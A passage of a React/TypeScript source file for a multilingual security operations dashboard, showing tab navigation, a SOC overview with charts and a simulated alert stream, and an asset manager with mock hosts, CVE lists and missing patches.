import React, { useState, useEffect, useRef } from 'react';
import { useTranslation } from 'react-i18next';
import LogSearchDiscoveryView from './LogSearchDiscoveryView';
import AssetDiscoveryView from './AssetDiscoveryView';
import { 
  Search, Clock, ChevronDown, ChevronRight, X, Filter, Plus, Minus, Download, Share2, 
  Terminal, Shield, Zap, Globe, Brain, ShieldAlert, Cpu, HardDrive, Database, Monitor,
  Activity, Play, CheckCircle2, RotateCcw, AlertTriangle, Trash2, Save, Send, ShieldCheck,
  Building2, Eye, HelpCircle, FileText, Wifi, Bell, Webhook, Sparkles, AlertCircle, FileCode, Check,
  Calendar, Settings
} from 'lucide-react';
import { 
  ResponsiveContainer, AreaChart, Area, PieChart, Pie, Cell, Tooltip, XAxis, YAxis, 
  CartesianGrid, Legend, BarChart, Bar 
} from 'recharts';
import { motion, AnimatePresence } from 'motion/react';
import { cn } from '../lib/utils';

// TYPES
interface LiveEvent {
  id: string;
  timestamp: string;
  host: string;
  os: 'windows' | 'linux' | 'macos';
  description: string;
  severity: 'Critical' | 'Warning' | 'Healthy';
  action: string;
}

export interface HostAsset {
  id: string;
  name: string;
  ip: string;
  os: 'windows' | 'linux' | 'macos';
  cpu: number;
  memory: number;
  status: 'online' | 'offline';
  cves: string[];
  specs: { cpuModel: string; ram: string; disk: string };
  software: string[];
  patches: string[];
}

export default function DiscoveryView() {
  const { t, i18n } = useTranslation();
  const currentLang = i18n.language || 'zh';
  const isZh = currentLang.startsWith('zh');
  const isJa = currentLang.startsWith('ja');
  const [activeSubTab, setActiveSubTab] = useState<'raw_logs' | 'asset_discovery' | 'soc_dashboard' | 'sql_hunting' | 'fim' | 'active_mitigation' | 'vector_pipeline' | 'victoria_rules'>('raw_logs');

  // Multi-Mode Layout Header Navbar
  const tabs = [
    { id: 'raw_logs', label: isZh ? '日誌檢索分析' : isJa ? 'ログ検索・分析' : 'Raw Log Search', icon: Search },
    { id: 'asset_discovery', label: isZh ? '資產與弱點發現' : isJa ? '資産・脆弱性検出' : 'Asset & Vuln Discovery', icon: Database },
    { id: 'soc_dashboard', label: isZh ? 'SOC 戰情總覽' : isJa ? 'SOC ダッシュボード' : 'SOC Dashboard', icon: Activity },
    { id: 'sql_hunting', label: isZh ? '即時 SQL 獵捕' : isJa ? 'リアルタイム SQL ハンティング' : 'Live SQL Hunting', icon: Terminal },
    { id: 'fim', label: isZh ? '檔案監控 (FIM)' : isJa ? 'ファイル監視 (FIM)' : 'File Integrity (FIM)', icon: FileCode },
    { id: 'active_mitigation', label: isZh ? '回應與隔離' : isJa ? '対応と隔離' : 'Mitigation & Isolation', icon: Zap },
    { id: 'vector_pipeline', label: isZh ? 'Vector VRL 路由' : isJa ? 'Vector VRL パイプライン' : 'Vector VRL Pipeline', icon: Share2 },
    { id: 'victoria_rules', label: isZh ? 'SIEM 告警規則' : isJa ? 'SIEM アラートルール' : 'SIEM Alert Rules', icon: ShieldAlert }
  ] as const;

  return (
    <div className="flex flex-col min-h-[800px] bg-slate-950 text-slate-100 rounded-2xl border border-gray-800 p-6 space-y-6">
      {/* Title & Header */}
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center border-b border-gray-800 pb-5 gap-4">
        <div>
          <div className="flex items-center gap-2">
            <span className="px-2.5 py-1 bg-blue-950/40 text-blue-400 text-xs font-black uppercase rounded border border-blue-800/30">LOG SEARCH & COLLECTION</span>
            <h1 className="text-xl font-black text-slate-100 uppercase tracking-wider">{isZh ? '日誌搜尋與威脅蒐集中心' : 'Log Search & Security Collection'}</h1>
          </div>
          <p className="text-xs text-slate-400 mt-1">
            {isZh 
              ? 'Concentric Fleet、osquery、Vector 與 VictoriaLogs 安全編排與資料管道檢視器。' 
              : 'Concentric Fleet, osquery, Vector, and VictoriaLogs orchestration layer & security pipeline visualizers.'}
          </p>
        </div>

        {/* Dynamic Integration Badges */}
        <div className="flex flex-wrap gap-2 text-[10px] font-mono font-bold">
          <span className="flex items-center gap-1 px-2.5 py-1 bg-emerald-950/40 text-emerald-400 border border-emerald-800/20 rounded">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
            osquery Daemon: {isZh ? '已綁定' : 'Bound'}
          </span>
          <span className="flex items-center gap-1 px-2.5 py-1 bg-emerald-950/40 text-emerald-400 border border-emerald-800/20 rounded">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
            FleetDM API: {isZh ? '已連接' : 'Connected'}
          </span>
          <span className="flex items-center gap-1 px-2.5 py-1 bg-blue-950/40 text-blue-400 border border-blue-800/20 rounded">
            <span className="w-1.5 h-1.5 rounded-full bg-blue-400"></span>
            Vector VRL Node: {isZh ? '運作中' : 'Active'}
          </span>
        </div>
      </div>

      {/* Primary Tab Selector */}
      <div className="flex flex-wrap gap-1 bg-slate-900/50 border border-gray-800/80 p-1 rounded-xl scrollbar-none overflow-x-auto">
        {tabs.map(tab => {
          const IconComp = tab.icon;
          const isActive = activeSubTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveSubTab(tab.id)}
              className={cn(
                "px-4 py-2 text-xs font-bold rounded-lg transition-all flex items-center gap-2 whitespace-nowrap",
                isActive 
                  ? "bg-blue-600 text-white shadow-lg shadow-blue-600/10" 
                  : "text-slate-400 hover:text-slate-100 hover:bg-slate-900"
              )}
            >
              <IconComp className={cn("w-3.5 h-3.5", isActive ? "text-white" : "text-slate-500")} />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* Tab Render Stage */}
      <div className="flex-1">
        <AnimatePresence mode="wait">
          <motion.div
            key={activeSubTab}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.15 }}
            className="h-full"
          >
            {activeSubTab === 'raw_logs' && <LogSearchDiscoveryView />}
            {activeSubTab === 'asset_discovery' && <AssetDiscoveryView />}
            {activeSubTab === 'soc_dashboard' && <SOCDashboard />}
            {activeSubTab === 'sql_hunting' && <SQLHuntingConsole />}
            {activeSubTab === 'fim' && <FIMCenter />}
            {activeSubTab === 'active_mitigation' && <ActiveMitigationCenter />}
            {activeSubTab === 'vector_pipeline' && <VectorPipelineSandbox />}
            {activeSubTab === 'victoria_rules' && <VictoriaLogsRules />}
          </motion.div>
        </AnimatePresence>
      </div>
    </div>
  );
}

// 1. SOC SEC OPS CENTER DASHBOARD
function SOCDashboard() {
  const [streamActive, setStreamActive] = useState(true);
  const [liveEvents, setLiveEvents] = useState<LiveEvent[]>([
    { id: 'evt-001', timestamp: '11:54:21', host: 'PROD-DB-01', os: 'linux', description: 'Possible SQL Injection - Postgres unexpected fork', severity: 'Critical', action: 'Awaiting Audit' },
    { id: 'evt-002', timestamp: '11:52:10', host: 'CORP-WIN-RECEPT', os: 'windows', description: 'Malware launch prevented: ransom_wannacry.dll', severity: 'Warning', action: 'Blocked' },
    { id: 'evt-003', timestamp: '11:51:02', host: 'DEVEL-MAC-01', os: 'macos', description: 'File modification inside read-only system system.log', severity: 'Warning', action: 'Ignored' },
    { id: 'evt-004', timestamp: '11:48:47', host: 'DMZ-PROXY-NGINX', os: 'linux', description: 'Nginx security rewrite loaded cleanly', severity: 'Healthy', action: 'Logged' },
    { id: 'evt-005', timestamp: '11:45:00', host: 'PROD-DB-01', os: 'linux', description: 'CPU burst trigger on backend system queries', severity: 'Healthy', action: 'Resolved' }
  ]);

  // Live Stream Thread Simulation
  useEffect(() => {
    if (!streamActive) return;
    const interval = setInterval(() => {
      const hosts = ['PROD-DB-01', 'DMZ-PROXY-NGINX', 'CORP-WIN-RECEPT', 'LDAP-AD-PRIMARY', 'SEC-GW-01'];
      const actions = ['Intercepted', 'Alerted', 'Contingency Sent', 'Isolated Check', 'Analyzed'];
      const errors = [
        { desc: 'osquery integrity alert: /bin/ps hash modification', sev: 'Critical' as const },
        { desc: 'VictoriaLogs threshold breached: 25 login failures from 192.168.12.98', sev: 'Critical' as const },
        { desc: 'Vector remap dropped unrecognized syslog payload', sev: 'Warning' as const },
        { desc: 'Fleet query dispatch completed: Host memory usage check ok', sev: 'Healthy' as const },
        { desc: 'Success check-in: system core packages intact', sev: 'Healthy' as const }
      ];
      const randomHost = hosts[Math.floor(Math.random() * hosts.length)];
      const randomError = errors[Math.floor(Math.random() * errors.length)];
      const randomAction = actions[Math.floor(Math.random() * actions.length)];
      
      const newEvt: LiveEvent = {
        id: `evt-${Math.floor(Math.random() * 900) + 100}`,
        timestamp: new Date().toLocaleTimeString(),
        host: randomHost,
        os: randomHost.includes('WIN') ? 'windows' : randomHost.includes('MAC') ? 'macos' : 'linux',
        description: randomError.desc,
        severity: randomError.sev,
        action: randomAction
      };

      setLiveEvents(prev => [newEvt, ...prev.slice(0, 9)]);
    }, 4500);

    return () => clearInterval(interval);
  }, [streamActive]);

  // Data for stacked charts
  const threatData = [
    { hour: '00:00', High: 4, Med: 12, Low: 40 },
    { hour: '04:00', High: 12, Med: 18, Low: 35 },
    { hour: '08:00', High: 8, Med: 24, Low: 58 },
    { hour: '12:00', High: 22, Med: 14, Low: 72 },
    { hour: '16:00', High: 15, Med: 30, Low: 64 },
    { hour: '20:00', High: 3, Med: 9, Low: 31 }
  ];

  const categoryPieData = [
    { name: 'FIM 篡改告警', value: 45, color: '#f43f5e' },
    { name: '登入失敗稽核', value: 30, color: '#f59e0b' },
    { name: '惡意進程攔截', value: 15, color: '#3b82f6' },
    { name: '其它系統常規', value: 10, color: '#10b981' }
  ];

  return (
    <div className="space-y-6">
      {/* 4 Block KPI Data Row */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        {[
          { title: '納管物理與虛擬端點', val: '142 Active Nodes', sub: '8 Nodes Offline', stat: 'Healthy', color: 'text-emerald-400', icon: Monitor },
          { title: '未處置高危 Critical 告警', val: '3 Active Threats', sub: '24 Hour Accumulative Logs', stat: 'Warning', color: 'text-rose-500', icon: ShieldAlert },
          { title: '全網硬體漏洞合規率', val: '84% Secure Ratio', sub: '3 Missing patches pending', stat: 'Warning', color: 'text-amber-500', icon: ShieldCheck },
          { title: '主動防禦防堵次數 (今日)', val: '18 Active Mitigations', sub: 'Firewall hooks triggered', stat: 'Healthy', color: 'text-emerald-400', icon: Zap }
        ].map((kpi, idx) => (
          <div key={idx} className="bg-slate-900 border border-gray-800 rounded-xl p-5 hover:border-gray-700 transition-all flex items-center justify-between">
            <div className="space-y-1">
              <span className="text-[10px] uppercase font-black tracking-widest text-slate-500">{kpi.title}</span>
              <h2 className={cn("text-xl font-black font-mono", kpi.color)}>{kpi.val}</h2>
              <p className="text-[9px] text-slate-400">{kpi.sub}</p>
            </div>
            <div className={cn("p-1.5 rounded-lg border", kpi.stat === 'Warning' ? 'bg-rose-950/20 border-rose-900/40 text-rose-400' : 'bg-emerald-950/20 border-emerald-900/40 text-emerald-400')}>
              <kpi.icon className="w-5 h-5" />
            </div>
          </div>
        ))}
      </div>

      {/* Middle Analytical charts Row */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* 24 Hour Stacked Area Threat Trend */}
        <div className="lg:col-span-2 bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl space-y-3">
          <div className="flex justify-between items-center border-b border-gray-800 pb-3">
            <div>
              <h3 className="text-xs font-black uppercase tracking-wider text-slate-200">24 小時全網風險威脅趨勢</h3>
              <p className="text-[10px] text-slate-500">LogsQL time based aggregation queries on VictoriaLogs server</p>
            </div>
            <span className="text-[9px] font-mono text-indigo-400 font-bold">INTERVAL: 4 HOURS</span>
          </div>

          <div className="h-56">
            <ResponsiveContainer width="100%" height="100%">
              <AreaChart data={threatData} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                <defs>
                  <linearGradient id="colorHigh" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor="#f43f5e" stopOpacity={0.3}/>
                    <stop offset="95%" stopColor="#f43f5e" stopOpacity={0}/>
                  </linearGradient>
                  <linearGradient id="colorMed" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor="#f59e0b" stopOpacity={0.3}/>
                    <stop offset="95%" stopColor="#f59e0b" stopOpacity={0}/>
                  </linearGradient>
                  <linearGradient id="colorLow" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.2}/>
                    <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
                  </linearGradient>
                </defs>
                <CartesianGrid stroke="#1f2937" strokeDasharray="3 3" vertical={false} />
                <XAxis dataKey="hour" stroke="#4b5563" fontSize={10} tickLine={false} />
                <YAxis stroke="#4b5563" fontSize={10} tickLine={false} />
                <Tooltip contentStyle={{ backgroundColor: '#0f172a', border: '1px solid #374151', borderRadius: '8px', fontSize: '11px' }} />
                <Legend iconSize={8} wrapperStyle={{ fontSize: '10px' }} />
                <Area type="monotone" name="High Risk (高危)" dataKey="High" stroke="#f43f5e" fillOpacity={1} fill="url(#colorHigh)" stackId="1" />
                <Area type="monotone" name="Medium Risk (中等)" dataKey="Med" stroke="#f59e0b" fillOpacity={1} fill="url(#colorMed)" stackId="1" />
                <Area type="monotone" name="Low Info (常規)" dataKey="Low" stroke="#3b82f6" fillOpacity={1} fill="url(#colorLow)" stackId="1" />
              </AreaChart>
            </ResponsiveContainer>
          </div>
        </div>

        {/* Doughnut Warning Categories */}
        <div className="bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl flex flex-col justify-between">
          <div className="border-b border-gray-800 pb-3">
            <h3 className="text-xs font-black uppercase tracking-wider text-slate-200">VictoriaLogs 告警類別分佈</h3>
            <p className="text-[10px] text-slate-500">Live categorization breakdown</p>
          </div>

          <div className="h-44 relative flex items-center justify-center">
            <ResponsiveContainer width="100%" height="100%">
              <PieChart>
                <Pie
                  data={categoryPieData}
                  cx="50%"
                  cy="50%"
                  innerRadius={50}
                  outerRadius={75}
                  paddingAngle={2}
                  dataKey="value"
                >
                  {categoryPieData.map((entry, index) => (
                    <Cell key={`cell-${index}`} fill={entry.color} />
                  ))}
                </Pie>
                <Tooltip formatter={(v) => `${v}%`} contentStyle={{ backgroundColor: '#0f172a', border: '1px solid #374151', borderRadius: '8px', fontSize: '11px' }} />
              </PieChart>
            </ResponsiveContainer>
            <div className="absolute flex flex-col items-center">
              <span className="text-xs font-bold text-slate-400 uppercase">總計</span>
              <span className="text-lg font-black font-mono">100%</span>
            </div>
          </div>

          {/* Legends */}
          <div className="grid grid-cols-2 gap-2 text-[10px] font-bold">
            {categoryPieData.map((item, idx) => (
              <div key={idx} className="flex items-center gap-1.5">
                <span className="w-2 h-2 rounded-full" style={{ backgroundColor: item.color }}></span>
                <span className="text-slate-400 block truncate">{item.name}</span>
                <span className="text-slate-300 font-mono text-right ml-auto">{item.value}%</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Live Stream Logs Feed */}
      <div className="bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl space-y-4">
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center border-b border-gray-800 pb-3 gap-2">
          <div>
            <h3 className="text-xs font-black uppercase tracking-wider text-slate-200 flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-rose-500 animate-pulse"></span>
              全域資安事件即時串流流水線 (Log Live Stream)
            </h3>
            <p className="text-[10px] text-slate-500">Sub-second threat activities audit logged into Central SIEM pipeline</p>
          </div>

          <div className="flex gap-2">
            <button
              onClick={() => setStreamActive(!streamActive)}
              className={cn("px-2.5 py-1 text-[10px] uppercase font-black tracking-wider rounded border transition-colors flex items-center gap-1", 
                streamActive ? "bg-amber-950/40 text-amber-400 border-amber-800/40 hover:bg-amber-900/30" : "bg-emerald-950/40 text-emerald-400 border-emerald-800/40 hover:bg-emerald-900/30")}
            >
              <Play className="w-3 h-3" />
              {streamActive ? 'Pause Stream' : 'Resume Stream'}
            </button>
            <button
              onClick={() => setLiveEvents([])}
              className="px-2.5 py-1 bg-slate-950 text-slate-500 hover:text-slate-300 hover:bg-slate-900 text-[10px] uppercase font-black tracking-wider rounded border border-gray-800 transition-colors"
            >
              Clear Feed
            </button>
          </div>
        </div>

        {/* Dense Table */}
        <div className="overflow-x-auto">
          <table className="w-full text-left font-mono text-xs border border-gray-800 rounded-xl overflow-hidden divide-y divide-gray-800">
            <thead className="bg-[#0b0c13] text-slate-400 text-[9px] uppercase tracking-wider font-bold">
              <tr>
                <th className="p-3">事件時間</th>
                <th className="p-3">受控主機名稱</th>
                <th className="p-3">OS 核心</th>
                <th className="p-3">核心探針日誌描述</th>
                <th className="p-3">危害等級</th>
                <th className="p-3">自動化動作</th>
                <th className="p-3 text-right">調查工具</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800 bg-slate-900/40">
              <AnimatePresence initial={false}>
                {liveEvents.map((evt) => (
                  <motion.tr
                    key={evt.id}
                    initial={{ opacity: 0, x: -10 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: 10 }}
                    transition={{ duration: 0.2 }}
                    className="hover:bg-slate-900/80 transition-colors group"
                  >
                    <td className="p-3 text-slate-500 whitespace-nowrap">{evt.timestamp}</td>
                    <td className="p-3 text-slate-200 font-bold">{evt.host}</td>
                    <td className="p-3">
                      <span className="text-[10px] font-bold uppercase py-0.5 px-2 bg-slate-950/60 border border-gray-800 rounded leading-none text-slate-400">
                        {evt.os}
                      </span>
                    </td>
                    <td className="p-3 text-slate-300 max-w-[300px] truncate leading-normal" title={evt.description}>
                      {evt.description}
                    </td>
                    <td className="p-3">
                      <span className={cn(
                        "px-2 py-0.5 rounded text-[8.5px] font-black uppercase tracking-wider border",
                        evt.severity === 'Critical' ? "bg-rose-950/40 text-rose-400 border-rose-800/40" :
                        evt.severity === 'Warning' ? "bg-amber-950/40 text-amber-400 border-amber-800/40" :
                        "bg-emerald-950/20 text-emerald-400 border-emerald-800/20"
                      )}>
                        {evt.severity}
                      </span>
                    </td>
                    <td className="p-3 text-indigo-400 font-bold">{evt.action}</td>
                    <td className="p-3 text-right whitespace-nowrap">
                      <div className="flex items-center justify-end gap-1.5 opacity-80 group-hover:opacity-100 transition-opacity">
                        <button className="px-1.5 py-0.5 bg-gray-950 hover:bg-blue-900/40 text-blue-400 border border-gray-800 rounded text-[9px] font-bold uppercase transition-colors">
                          🔍 調查
                        </button>
                        <button className="px-1.5 py-0.5 bg-gray-950 hover:bg-rose-950/60 text-rose-400 border border-gray-800 rounded text-[9px] font-bold uppercase transition-colors">
                          🛡️ 隔離
                        </button>
                      </div>
                    </td>
                  </motion.tr>
                ))}
              </AnimatePresence>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

// 2. ENDPOINT DIRECTORY & ASSET MANAGEMENT
export function AssetsManager() {
  const [selectedHost, setSelectedHost] = useState<HostAsset | null>(null);
  const [searchWord, setSearchWord] = useState('');
  const [osTab, setOsTab] = useState<'All' | 'windows' | 'linux' | 'macos'>('All');

  const hosts: HostAsset[] = [
    {
      id: "node-23lq",
      name: "WIN-23LQ-DBPROD",
      ip: "10.120.100.100",
      os: "windows",
      cpu: 45,
      memory: 72,
      status: "online",
      cves: ["CVE-2024-21413", "CVE-2023-5678", "CVE-2022-9999"],
      specs: { cpuModel: "Intel Xeon Silver 4214R @ 2.40GHz", ram: "32GB ECC DDR4", disk: "1.2TB Enterprise NVMe SSD" },
      software: ["Microsoft IIS Web Server 10.0", "PostgreSQL database Engine v15.2", "osquery Agent v5.11.0", "Splunk Universal Forwarder"],
      patches: ["KB5034123 - Outlook RCE patch missing", "KB5029011 - Security rollup update needed"]
    },
    {
      id: "node-db1",
      name: "PROD-DB-01",
      ip: "10.0.0.12",
      os: "linux",
      cpu: 18,
      memory: 84,
      status: "online",
      cves: ["CVE-2024-1234"],
      specs: { cpuModel: "AMD EPYC 7763 64-Core Processor", ram: "64GB DDR4", disk: "2.0TB PCI-e Gen 4.0 SSD" },
      software: ["PostgreSQL database Engine v13.4", "Docker Community Engine v24.0", "osquery Agent v5.10.4", "Vector Logging Client"],
      patches: ["Critical Security Patch: libcrypto.so upgrade missing"]
    },
    {
      id: "node-nginx",
      name: "DMZ-PROXY-NGINX",
      ip: "10.0.0.45",
      os: "linux",
      cpu: 8,
      memory: 31,
      status: "online",
      cves: [],
      specs: { cpuModel: "Intel Xeon E-2276G 6-Core", ram: "16GB RAM", disk: "500GB SSD" },
      software: ["Nginx Secure Daemon v1.21.0", "osquery Agent v5.11.2", "Certbot LetsEncrypt AutoRenewal"],
      patches: ["All active stable patches applied"]
    },
    {
      id: "node-mac",
      name: "DEVEL-MAC-01",
      ip: "192.168.12.50",
      os: "macos",
      cpu: 2,
      memory: 92,
      status: "online",
      cves: ["CVE-2023-3450"],
      specs: { cpuModel: "Apple M2 Pro Max", ram: "32GB Unified Memory", disk: "1.0TB NVMe flash" },
      software: ["Apple MacOS Sonoma 14.1", "Xcode CLI Tools Core", "osquery Client v5.11.0"],
      patches: ["Supplemental security patch macOS 14.2 pending"]
    },
    {
      id: "node-admin",
      name: "WS-ADMIN-05",
      ip: "10.0.0.100",
      os: "windows",
      cpu: 0,
      memory: 0,
      status: "offline",
      cves: [],
      specs: { cpuModel: "Intel Core i7-11700K @ 3.60GHz", ram: "16GB RAM", disk: "512GB NVMe SSD" },
      software: ["Windows 11 Pro Enterprise", "osquery Desktop Client v5.9.0"],
      patches: ["Wired connection offline, unable to poll windows catalog status"]
    }
  ];

  const filteredHosts = hosts.filter(h => {
    const matchesSearch = h.name.toLowerCase().includes(searchWord.toLowerCase()) || h.ip.includes(searchWord);
    const matchesOs = osTab === 'All' ? true : h.os === osTab;
    return matchesSearch && matchesOs;
  });

  return (
    <div className="relative space-y-4">
      {/* Upper toolbar */}
      <div className="flex flex-col sm:flex-row gap-4 justify-between items-stretch sm:items-center bg-slate-900 border border-gray-850 p-4 rounded-xl">
        {/* Navigation Tabs for OS */}
        <div className="flex bg-slate-950 p-1 rounded-lg border border-gray-800">
          {(['All', 'windows', 'linux', 'macos'] as const).map(os => (
            <button
              key={os}
              onClick={() => setOsTab(os)}
              className={cn("px-3 py-1 text-[11px] font-black uppercase rounded", osTab === os ? "bg-blue-600 text-white" : "text-slate-400 hover:text-slate-200")}
            >
              {os === 'All' ? '全系統' : os}
            </button>
          ))}
        </div>

        {/* Global Search Host */}
        <div className="relative flex-1 max-w-sm">
          <Search className="w-4 h-4 text-slate-500 absolute left-3 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            placeholder="透過端點名稱、標籤、IP 地址檢索..."
            value={searchWord}
            onChange={(e) => setSearchWord(e.target.value)}
            className="w-full bg-slate-950 border border-gray-800 rounded-lg pl-9 pr-4 py-2 text-xs text-slate-200 outline-none focus:border-blue-500"
          />
        </div>
      </div>

      {/* Grid of Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
        {filteredHosts.map(host => {
          const hasCVECount = host.cves.length;
          return (
            <div
              key={host.id}
              onClick={() => setSelectedHost(host)}
              className={cn(
                "bg-slate-900 border border-gray-800 rounded-xl p-5 hover:border-blue-500/50 transition-all cursor-pointer flex flex-col justify-between space-y-4 relative group",
                hasCVECount > 0 && "border-rose-950/40 shadow-inner"
              )}
            >
              {/* Card Top Title bar */}
              <div className="flex justify-between items-start">
                <div className="flex items-center gap-2">
                  <span className={cn("w-2 h-2 rounded-full animate-pulse", host.status === 'online' ? 'bg-emerald-400' : 'bg-slate-600')}></span>
                  <p className="text-xs font-black text-slate-100 uppercase tracking-tight">{host.name}</p>
                </div>
                <span className="text-[10px] font-mono text-slate-500">{host.ip}</span>
              </div>

              {/* Stats Bars */}
              {host.status === 'online' ? (
                <div className="space-y-2 text-[11px] font-bold text-slate-400">
                  <div className="space-y-1">
                    <div className="flex justify-between">
                      <span>CPU 負載</span>
                      <span className="font-mono text-slate-300">{host.cpu}%</span>
                    </div>
                    <div className="h-1 bg-slate-950 rounded-full overflow-hidden">
                      <div className="h-full bg-blue-500" style={{ width: `${host.cpu}%` }}></div>
                    </div>
                  </div>
                  <div className="space-y-1">
                    <div className="flex justify-between">
                      <span>RAM 使用率</span>
                      <span className="font-mono text-slate-300">{host.memory}%</span>
                    </div>
                    <div className="h-1 bg-slate-950 rounded-full overflow-hidden">
                      <div className="h-full bg-indigo-500" style={{ width: `${host.memory}%` }}></div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="py-2 flex items-center gap-2 text-[10px] uppercase font-bold text-slate-500 font-mono">
                  <span className="text-[9px] px-1 py-0.5 bg-slate-950 border border-gray-800 rounded">OFFLINE</span>
                  Last polled check-in: 12h ago
                </div>
              )}

              {/* Bottom CVE Banner if critical patches needed */}
              {hasCVECount > 0 ? (
                <div className="bg-rose-950/20 border border-rose-900/40 p-2.5 rounded-lg text-rose-400 text-[10.5px] font-bold flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0 text-rose-500 animate-bounce" />
                  <span>檢測到 {hasCVECount} 個未修補的重大 CVE 漏洞 !</span>
                </div>
              ) : (
                <div className="bg-emerald-950/10 border border-emerald-900/30 p-2 text-emerald-400 text-[10px] rounded-lg flex items-center gap-1.5 justify-center">
                  <Check className="w-3.5 h-3.5" /> SECURE BASELINE VERIFIED
                </div>
              )}

              {/* Subtle click guide */}
              <div className="absolute right-3 bottom-3 opacity-0 group-hover:opacity-100 text-[10px] font-black uppercase text-blue-400 tracking-wider transition-opacity flex items-center gap-0.5">
                詳細 <ChevronRight className="w-3.5 h-3.5" />
              </div>
            </div>
          );
        })}
      </div>

      {/* Slide Drawer Over panel */}
      <AnimatePresence>
        {selectedHost && (
          <>
            {/* Backdrop */}
            <div className="fixed inset-0 bg-black/75 z-50 backdrop-blur-xs" onClick={() => setSelectedHost(null)}></div>
            
            {/* Panel */}
            <motion.div
              initial={{ x: '100%' }}
              animate={{ x: 0 }}
              exit={{ x: '100%' }}
              transition={{ type: 'spring', damping: 25, stiffness: 200 }}
              className="fixed top-0 right-0 w-full max-w-lg h-full bg-[#0d0f19] border-l border-gray-800/80 p-6 z-50 shadow-3xl text-slate-100 overflow-y-auto flex flex-col justify-between custom-scrollbar"
            >
              <div className="space-y-6">
                {/* Header detail */}
                <div className="flex justify-between items-start border-b border-gray-800 pb-4">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className={cn("w-2 h-2 rounded-full", selectedHost.status === 'online' ? 'bg-emerald-400 animate-pulse' : 'bg-slate-600')}></span>
                      <h2 className="text-sm font-black uppercase text-slate-100">{selectedHost.name}</h2>
                    </div>
                    <p className="text-[10px] text-slate-500 mt-1 font-mono">NODE ID: {selectedHost.id} | IP: {selectedHost.ip}</p>
                  </div>
                  <button onClick={() => setSelectedHost(null)} className="p-1 hover:bg-slate-900 rounded-lg text-slate-400 hover:text-white">
                    <X className="w-5 h-5" />
                  </button>
                </div>

                {/* Sub Tab Panel Inside Drawer */}
                <DrawerTabs selectedHost={selectedHost} />
              </div>

              {/* Actions Footer */}
              <div className="border-t border-gray-800 pt-4 mt-6 flex gap-3">
                <button
                  onClick={() => alert(`Issuing raw osquery baseline audit command to ${selectedHost.name}...`)}
                  className="flex-1 py-2 px-4 bg-slate-900 hover:bg-slate-800 border border-gray-800 rounded-lg text-xs font-bold text-center transition-colors"
                >
                  🚀 osquery 重新稽核
                </button>
                <button
                  onClick={() => alert(`Isolating node ${selectedHost.name} via FleetDM API...`)}
                  className="flex-1 py-2 px-4 bg-rose-650 hover:bg-rose-700 text-white rounded-lg text-xs font-black text-center transition-all"
                >
                  🛡️ 一鍵隔離主機
                </button>
              </div>
            </motion.div>
          </>
        )}
      </AnimatePresence>
    </div>
  );
}

// Draw tabs
function DrawerTabs({ selectedHost }: { selectedHost: HostAsset }) {
  const [panelTab, setPanelTab] = useState<'specs' | 'software' | 'patches'>('specs');

  return (
    <div className="space-y-4">
      <div className="flex bg-slate-950 p-1 rounded-lg border border-gray-800">
        {[
          { id: 'specs', label: '基本規格' },
          { id: 'software', label: '已安裝軟體清單' },
          { id: 'patches', label: '缺失修補補丁' }
        ].map(pt => (
          <button
            key={pt.id}
            onClick={() => setPanelTab(pt.id as any)}
            className={cn("flex-1 text-center py-1.5 text-[11px] font-bold rounded capitalize transition-all", 
              panelTab === pt.id ? "bg-slate-900 text-blue-400 border border-gray-800" : "text-slate-500 hover:text-slate-300")}
          >
            {pt.label}
          </button>
        ))}
      </div>

      {/* Panel Tab Content view */}
      <div className="bg-slate-950 rounded-xl border border-gray-805 p-4 min-h-[220px]">
        {panelTab === 'specs' && (
          <div className="space-y-3 text-xs">
            <div>
              <span className="text-slate-500 font-mono">CPU 處理器規格:</span>
              <p className="text-slate-300 font-serif font-black">{selectedHost.specs.cpuModel}</p>
            </div>
            <div>
              <span className="text-slate-500 font-mono">系統記憶體 (RAM):</span>
              <p className="text-slate-300 font-mono font-bold">{selectedHost.specs.ram}</p>
            </div>
            <div>
              <span className="text-slate-500 font-mono">主要儲存磁碟空間:</span>
              <p className="text-slate-300 font-mono font-bold">{selectedHost.specs.disk}</p>
            </div>
            <div className="pt-2 border-t border-gray-900">
              <span className="text-slate-500 font-mono">危害漏洞明細:</span>
              <div className="flex flex-wrap gap-1.5 mt-2">
                {selectedHost.cves.length > 0 ? (
                  selectedHost.cves.map(c => (
                    <span key={c} className="px-2 py-0.5 bg-rose-950/80 text-rose-400 text-[10px] font-bold font-mono rounded border border-rose-800/40">
                      {c}
                    </span>
                  ))
                ) : (
                  <span className="text-emerald-400 font-bold">✔ 漏洞資料庫未檢出缺失</span>
                )}
              </div>
            </div>
          </div>
        )}

        {panelTab === 'software' && (
          <div className="space-y-2 text-xs">
